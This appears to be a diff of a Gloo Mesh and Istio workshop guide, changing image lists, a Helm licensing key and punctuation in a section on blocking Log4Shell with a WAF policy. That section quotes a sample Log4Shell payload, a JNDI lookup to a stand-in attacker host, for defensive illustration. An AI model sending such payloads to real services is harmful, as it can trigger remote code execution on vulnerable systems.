@@ -175,7 +175,7 @@ us-docker.pkg.dev/gloo-mesh/istio-workshops/pilot:1.20.2-solo
 us-docker.pkg.dev/gloo-mesh/istio-workshops/proxyv2:1.20.2-solo
 EOF
 
-for url in https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/networking/bookinfo-gateway.yaml
+for url in https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/networking/bookinfo-gateway.yaml https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo-ratings-v2-mysql-vm.yaml
 do
   for image in $(curl -sfL ${url}|grep image:|awk '{print $2}')
   do
@@ -263,7 +263,7 @@ helm upgrade --install gloo-platform-mgmt gloo-platform \
   --version 2.5.0 \
   -f -<<EOF
 licensing:
-  licenseKey: ${GLOO_MESH_LICENSE_KEY}
+  glooTrialLicenseKey: ${GLOO_MESH_LICENSE_KEY}
 common:
   cluster: cluster1
 glooInsightsEngine:
@@ -326,6 +326,7 @@ telemetryCollector:
         endpoint: gloo-telemetry-gateway:4317
   image:
     repository: ${registry}/gloo-mesh/gloo-otel-collector
+
 EOF
 
 kubectl --context ${MGMT} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
@@ -2454,7 +2455,7 @@ The Log4Shell vulnerability impacted all Java applications that used the log4j l
 
 Using the Web Application Firewall capabilities you can reject requests containing such headers. 
 
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
 
 Create the WAF policy:
 
